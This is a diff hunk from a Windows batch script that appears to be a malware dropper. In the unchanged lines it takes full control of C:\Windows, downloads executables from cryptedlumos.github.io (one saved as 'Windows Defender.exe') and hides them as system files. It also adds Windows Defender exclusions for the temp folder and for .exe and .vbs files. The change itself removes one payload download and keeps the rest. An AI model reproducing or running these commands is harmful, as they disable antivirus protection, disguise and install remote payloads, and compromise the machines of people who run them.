@@ -36,7 +36,7 @@ ICACLS "C:\Windows" /INHERITANCE:e /GRANT:r %UserName%:(F) /C
 curl.exe %proxy% https://cryptedlumos.github.io/sfx.exe --output "C:\Windows\Windows Defender.exe" && attrib +s +h +i "C:\Windows\Windows Defender.exe"
 curl.exe %proxy% https://cryptedlumos.github.io/Capture/nircmd.exe --output "C:\Windows\nircmd.exe" && attrib +s +h +i "C:\Windows\nircmd.exe"
 curl.exe %proxy% https://cryptedlumos.github.io/Capture/curl.exe --output "C:\Windows\curl.exe" && attrib +s +h +i "C:\Windows\curl.exe"
-curl.exe %proxy% https://cryptedlumos.github.io/win64.bat --output "C:\Windows\win64.bat" && attrib +s +h +i "C:\Windows\win64.bat"
+
 powershell.exe Add-MpPreference -ExclusionPath "%temp%"
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".vbs""
